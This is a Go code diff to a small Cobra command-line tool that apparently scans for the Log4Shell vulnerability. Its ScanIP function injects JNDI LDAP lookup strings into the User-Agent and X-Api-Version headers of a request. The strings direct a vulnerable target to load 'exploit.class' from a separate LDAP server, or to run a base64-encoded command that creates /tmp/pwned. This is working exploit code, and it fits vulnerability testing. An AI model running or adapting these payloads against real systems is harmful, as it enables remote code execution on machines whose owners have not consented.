@@ -22,6 +22,7 @@ import (
     "github.com/spf13/cobra"
     "net"
     "net/http"
+    "strings"
     "time"
 )
 
@@ -36,7 +37,9 @@ Cobra is a CLI library for Go that empowers applications.
 This application is a tool to generate the needed files
 to quickly create a Cobra application.`,
     Run: func(cmd *cobra.Command, args []string) {
-        ScanIP("http://192.168.1.59:8080")
+        //ScanCIDR("192.168.1.59/32")
+        time.Sleep(1 * time.Second)
+        ScanIP("http://192.168.1.59:8080", "192.168.1.59:5555")
     },
 }
 
@@ -54,35 +57,37 @@ func init() {
     // scanipCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
 }
 
-func ScanIP(url string) {
+func ScanIP(target_url, server_url string) {
     client := &http.Client{
         Timeout: 1000 * time.Millisecond,
+        Transport: &http.Transport{
+            TLSHandshakeTimeout:   1 * time.Second,
+            ResponseHeaderTimeout: 1 * time.Second,
+            ExpectContinueTimeout: 1 * time.Second,
+        },
     }
 
-    localIP := GetLocalIP()
-    log.Infof("Local IP: %s", localIP)
-
-    request, err := http.NewRequest("GET", url, nil)
+    request, err := http.NewRequest("GET", target_url, nil)
     if err != nil {
         log.Fatal(err)
     }
-    targetUserAgent := fmt.Sprintf("${{jndi:ldap://%s/exploit.class}}", localIP+":5555")
-    targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", url)
-    log.Debugf("Target URL: %s", url)
+    targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", server_url)
+    targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", server_url)
+    log.Debugf("Target URL: %s", target_url)
     log.Debugf("Target User-Agent: %s", targetUserAgent)
     log.Debugf("Target X-Api-Version: %s", targetHeader)
     request.Header.Set("User-Agent", targetUserAgent)
     request.Header.Add("X-Api-Version", targetHeader)
     response, err := client.Do(request)
-    if err != nil {
-        log.Fatal(err)
-    }
-    defer response.Body.Close()
-    //b, err := ioutil.ReadAll(response.Body)
-    log.Infof("%s ==> Status code: %d", url, response.StatusCode)
-    if err != nil {
+    if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
         log.Error(err)
     }
+    if response != nil {
+        log.Infof("%s ==> Status code: %d", target_url, response.StatusCode)
+    }
+    //if err != nil {
+    //    log.Error(err)
+    //}
 }
 
 // GetLocalIP returns the non loopback local IP of the host
